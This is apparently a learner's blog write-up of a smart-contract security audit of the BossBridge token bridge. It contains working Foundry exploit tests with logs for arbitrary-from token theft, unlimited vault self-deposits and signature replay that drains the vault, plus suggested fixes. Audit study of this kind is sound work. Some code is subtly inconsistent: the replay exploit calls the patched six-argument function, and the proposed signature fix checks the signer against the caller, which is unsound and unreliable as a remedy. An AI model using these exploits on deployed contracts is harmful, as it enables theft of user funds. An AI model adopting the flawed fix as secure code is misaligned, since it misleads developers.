---
layout: post
title: "BossBridge audit"
date: 2025-09-16
classes: wide
tags:
  - web3
  - audit
---

_This article mainly records the questions and gains I encountered while learning smart contract security auditing._

# Routine Checks

For this project, `aderyn` did not find any serious issues, but `slither` detected many problems. This reminds us again that every tool has its necessity; there is no such thing as a universally perfect tool.

```sh
L1BossBridge.depositTokensToL2(address,address,uint256) (src/L1BossBridge.sol#73-81) uses arbitrary from in transferFrom: token.safeTransferFrom(from,address(vault),amount) (src/L1BossBridge.sol#77)
Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#arbitrary-from-in-transferfrom
```

This is part of the output from `slither`. Based on these two outputs, we can identify at least three high-risk vulnerabilities.

# Excessive Trust in Incoming Parameters Leading to Fund Loss

Due to adding some comments in the project, the line numbers shown by `slither` may differ from your local runs, but this is not a big issue.

```javascript
    function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
@>      token.safeTransferFrom(from, address(vault), amount);


        emit Deposit(from, l2Recipient, amount);
    }
```

It can be seen that during the `transfer`, the passed-in parameter `from` is used directly. Let's look at `slither`'s official explanation of this problem:

> _Alice approves this contract to spend her ERC20 tokens. Bob can call a and specify Alice's address as the_ `from` _parameter in_ `transferFrom`_, allowing him to transfer Alice's tokens to himself._

According to this explanation and the project code, the problem occurring during `transfer` is clear. It shows that `slither`'s detection capability is indeed strong.

Next, let's write some code to verify this issue. It's quite simple: first call `approve`, then directly call `depositTokensToL2`.

```javascript
    function testDepositTokensToL2() public {
        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);


        uint256 depositAmount = token.balanceOf(user);
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, attacker, depositAmount);
        tokenBridge.depositTokensToL2(user, attacker, depositAmount);

        console2.log("balance of user: ", token.balanceOf(user));
        console2.log("balance of vault: ", token.balanceOf(address(vault)));
        vm.stopPrank();
    }
```

```sh
Logs:
  balance of user:  0
  balance of vault:  1000000000000000000000
```

From the execution result, the user's initial `1000e18` tokens have all been transferred into the `vault`. This is because in the code, the second parameter of `safeTransferFrom` is fixed; no matter what second parameter we pass into `depositTokensToL2`, the amount always ends up deposited into the `vault`.

# Unlimited Self-Transfers Causing `BBT` Inflation

This vulnerability has the same root cause as above, except this time it's transferring tokens to oneself. The project partial introduction reads:

> _Successful deposits trigger an event that our off-chain mechanism picks up, parses it and mints the corresponding tokens on L2._

It can be seen that if unlimited self-transfers are possible, then the corresponding tokens will also be unlimited, which would completely break the protocol.

```javascript
    constructor(IERC20 _token) Ownable(msg.sender) {
        token = _token;
        vault = new L1Vault(token);
@>      vault.approveTo(address(this), type(uint256).max);
    }
```

From the contract initialization code, we can infer that, using the same method, self-transfers can be triggered. The sender and recipient are the same address. The exploit code is as follows:

```javascript
    function testTransferVaultToVault() public {
        address attacker = makeAddr("attacker");
        
        uint256 vaultBalance = 500e18;
        deal(address(token), address(vault), vaultBalance);


        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), address(attacker), vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);


        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), address(attacker), vaultBalance);
        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance);
    }
```

This code does not require any output; as long as it runs without error, the self-deposit succeeded. Here we only tried twice; in fact, it can loop infinitely. The fix for these two vulnerabilities is the same and has been provided in `slither`'s official documentation.

```diff
    function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
-       token.safeTransferFrom(from, address(vault), amount);
+       token.safeTransferFrom(msg.sender, address(vault), amount);

        emit Deposit(from, l2Recipient, amount);
    }
```

# Signature Replay

The contract uses `ECDSA` signatures. We don't need to know exactly how the signatures are implemented; we only need to note that signature components `v`, `r`, `s` are publicly visible on-chain when the contract transaction occurs. If the signature content is not properly verified, it will lead to signature replay attacks, which is very serious. Such vulnerabilities allow attackers to impersonate anyone to perform transactions.

```javascript
@>  function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
        sendToL1(
            v,
            r,
            s,
            abi.encode(
                address(token),
                0, // value
                abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount))
            )
        );
    }
```

The `withdrawTokensToL1` function uses signatures without any verification. We can write exploit code to verify if this vulnerability can be exploited. The exploit process is simple: first, put some money in the vault; then the `attacker` deposits money into the vault; finally, the attacker reuses the previously used signature to withdraw all funds.

```javascript
    function testSigReplay() public {
        address attacker = makeAddr("attacker");
        uint256 vaultInitBalance = 1000e18;
        uint256 attackerInitBalance = 100e18;
        deal(address(token), address(vault), vaultInitBalance);
        deal(address(token), address(attacker), attackerInitBalance);
        console2.log("stage 1");
        console2.log("balance of vault: ", token.balanceOf(address(vault)));
        console2.log("balance of attacker: ", token.balanceOf(address(attacker)));
        
        vm.startPrank(attacker);
        token.approve(address(tokenBridge), type(uint256).max);
        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitBalance);
        console2.log("stage 2");
        console2.log("balance of vault: ", token.balanceOf(address(vault)));
        console2.log("balance of attacker: ", token.balanceOf(address(attacker)));


        bytes memory message = abi.encode(address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitBalance)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));

        while(token.balanceOf(address(vault)) > 0) {
            tokenBridge.withdrawTokensToL1(attacker, attackerInitBalance, v, r, s, uint256(block.timestamp));
        }
        console2.log("stage 3");
        console2.log("balance of vault: ", token.balanceOf(address(vault)));
        console2.log("balance of attacker: ", token.balanceOf(address(attacker)));
    }
```

```sh
Logs:
  stage 1
  balance of vault:  1000000000000000000000
  balance of attacker:  100000000000000000000
  stage 2
  balance of vault:  1100000000000000000000
  balance of attacker:  0
  stage 3
  balance of vault:  0
  balance of attacker:  1100000000000000000000
```

From the result, signature replay caused all funds to be stolen, which can completely destroy the contract. The fix is simple: just perform signature verification.

```diff
    mapping(address account => bool isSigner) public signers;
+   mapping(address => uint256) public nonces;

-   function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s) external {
+   function withdrawTokensToL1(address to, uint256 amount, uint8 v, bytes32 r, bytes32 s, uint256 deadline) external {
+       require (block.timestamp <= deadline, "Signature expired");
+       uint256 nonce = nonces[msg.sender];
+
+       bytes32 digest = keccak256(abi.encodePacked(to, amount, nonce, deadline));
+
+       address signer = ecrecover(digest, v, r, s);
+       require(signer == msg.sender, "Invalid signature");
+
+       nonces[msg.sender]++;

        sendToL1(
            v,
            r,
            s,
            abi.encode(
                address(token),
                0, // value
                abi.encodeCall(IERC20.transferFrom, (address(vault), to, amount))
            )
        );
    }
```

# Incorrect `zkSync` Call Method

This vulnerability is very simple. By reading the official `zkSync` documentation [here](https://docs.zksync.io/zksync-protocol/differences/evm-instructions#create-create2), you can find that the contract uses an incorrect invocation method.

```javascript
    function deployToken(string memory symbol, bytes memory contractBytecode) public onlyOwner returns (address addr) {
        assembly {
@>          addr := create(0, add(contractBytecode, 0x20), mload(contractBytecode))
        }
        s_tokenToAddress[symbol] = addr;
        emit TokenDeployed(symbol, addr);
    }
```

# Summary

The serious issues in the `BossBridge` contract are roughly as above. There are still some problems that are beyond my current capability, so I need to read others' documentation for further analysis later.

The complete report can be found [here](https://github.com/pureGavin/codehawks/blob/main/BossBridge/report.pdf)
